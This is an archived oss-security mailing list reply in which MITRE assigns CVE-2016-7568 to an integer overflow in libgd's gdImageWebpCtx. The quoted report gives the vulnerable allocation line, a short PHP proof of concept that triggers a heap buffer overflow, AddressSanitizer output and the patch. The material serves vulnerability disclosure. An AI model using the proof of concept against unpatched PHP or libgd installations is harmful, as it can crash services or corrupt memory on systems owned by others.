X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["2108" "Wednesday" "28" "September" "2016" "14:54:09" "-0400" "cve-assign@mitre.org" "cve-assign@mitre.org" "<20160928185409.5FF6C36E015@smtpvbsrv1.mitre.org>" "58" "[oss-security] Re: CVE Request: libgd: Integer overflow in function gdImageWebpCtx of gd_webp.c" "^Cc:" nil nil "9" "2016092818:54:09" "[oss-security] Re: CVE Request: libgd: Integer overflow in function gdImageWebpCtx of gd_webp.c" (number mark "U       cve-assign@m Sep 28   58/2108  " thread-indent "\"[oss-security] Re: CVE Request: libgd: Integer overflow in function gdImageWebpCtx of gd_webp.c\"\n") "<1F2D4DA31CA62740BFF46830A0E6A4F706707654@EXMBX-TJ002.tencent.com>" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 24143 invoked by uid 550); 28 Sep 2016 18:54:22 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 24122 invoked from network); 28 Sep 2016 18:54:21 -0000
In-Reply-To: <1F2D4DA31CA62740BFF46830A0E6A4F706707654@EXMBX-TJ002.tencent.com>
Message-Id: <20160928185409.5FF6C36E015@smtpvbsrv1.mitre.org>
Cc: cve-assign@mitre.org, oss-security@lists.openwall.com
Date: Wed, 28 Sep 2016 14:54:09 -0400 (EDT)
From: cve-assign@mitre.org
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] Re: CVE Request: libgd: Integer overflow in function gdImageWebpCtx of gd_webp.c
To: winsonliu@tencent.com

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256

> An integer overflow vulnerability was found in function gdImageWebpCtx
> of file gd_webp.c in libgd. It could lead to heap buffer overflow
> circumstance. Both PHP 7.0.10 and libgd 2.2.3 were affected
> 
> PHP reported via https://bugs.php.net/bug.php?id=73003
> PHP fixed via https://github.com/php/php-src/commit/c18263e0e0769faee96a5d0ee04b750c442783c6
> libgd reported via https://github.com/libgd/libgd/issues/308
> libgd fixed via https://github.com/libgd/libgd/commit/40bec0f38f50e8510f5bb71a82f516d46facde03
> 
> argb = (uint8_t *)gdMalloc(gdImageSX(im) * 4 * gdImageSY(im));  /* integer overflow!!! */
> 
> There is no overflow check before calling the gdMalloc function.
> 
> POC
>     ini_set('memory_limit', -1);
>     $im = imagecreatetruecolor(0x8000, 0x8001);
>     imagewebp($im, 'php.webp');
>     imagedestroy($im);
> 
> AddressSanitizer: heap-buffer-overflow
> WRITE of size 1
> 
> PATCH
> if (overflow2(gdImageSX(im), 4)) {
>     return;
> }
> 
> if (overflow2(gdImageSX(im) * 4, gdImageSY(im))) {
>     return;
> }

Use CVE-2016-7568.

- -- 
CVE Assignment Team
M/S M300, 202 Burlington Road, Bedford, MA 01730 USA
[ A PGP key is available for encrypted communications at
  http://cve.mitre.org/cve/request_id.html ]
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1

iQIcBAEBCAAGBQJX7BFqAAoJEHb/MwWLVhi2kfoP/1owiTLiVQs33ewsVmLqdrmq
L20K6eMWkt15djVUcpGtBvH4ebcbnXZdXUIsqKOuQoiwWMYWpC0FTCD9tOK3SKLI
uKcaIcuPKgXfUM3KDgJww1tBZ8t+AKwjRf18A23KAFmJ63LO+QgrZT5nwmW0lff1
QOZ/7F80hBQJa2rOqOCWRg0BWZvPJ5djKfgQ4+3pwEl++4CRoKP2ABsdqwL6SCNe
kw7OvYITxfx9BGEGPh6/NCZoLvTVXEHZjHQVhWlobpGpO75DPC5eEyxCXEO3KBxK
4mKQADERR1yIafLLtlkWYg2awsHg2JOahcjL2vK2/32OOG2gkXe6ihsgUWKWZp/V
HcFBK6l9xo4R5eVm11sr0t9F0H/IYSfqOd7wijfDZbwNELqLi8gO0vWcvj2HNfLs
KzosUgCtz74JVz3vAXdk5e83EJv/9DTXbC5kyA+yfIXaGjm97jSkrXsfktNsnQ4N
5cSWbuxg9W/I5qGuXmhNhqE1EJVRWBkc/3DaCQoS6/XRV9PiUqg0EhZFAtHCcrOg
xO55mA4m1ZjIHUaox4RBEeLIHpIeSNBywAsfFtOmCMTfupNTM1xWft4Nsg3be/p+
4yKY3wr8YZ70fWopenDixR9OKMcUINTCFNB0HGPAsUhBuu4849yExTanXfAdaTa3
EQl2ePo/sn4HttO+tXO2
=3man
-----END PGP SIGNATURE-----
